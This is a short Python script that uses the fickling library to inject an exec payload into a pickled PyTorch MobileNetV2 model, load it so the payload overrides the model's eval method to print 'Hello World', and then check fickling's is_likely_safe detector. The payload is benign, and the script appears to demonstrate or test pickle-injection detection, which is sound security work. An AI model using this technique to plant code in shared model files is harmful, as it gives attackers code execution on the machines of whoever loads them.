import torch
import torchvision.models as models
import pickle
from fickling.pickle import Pickled
import sys
import torchvision
import os

model = models.mobilenet_v2()

payload = '''exec("""type(model).eval = eval('lambda model: print("Hello World")')""")'''

fickled_model = Pickled.load(pickle.dumps(model))

fickled_model.insert_python_exec(payload)

model = pickle.loads(fickled_model.dumps())

model.eval()


print("\n\nIs this is_likely_safe?")

safety = fickled_model.is_likely_safe

if safety is False:
    print("❌")
else:
    print("✅")


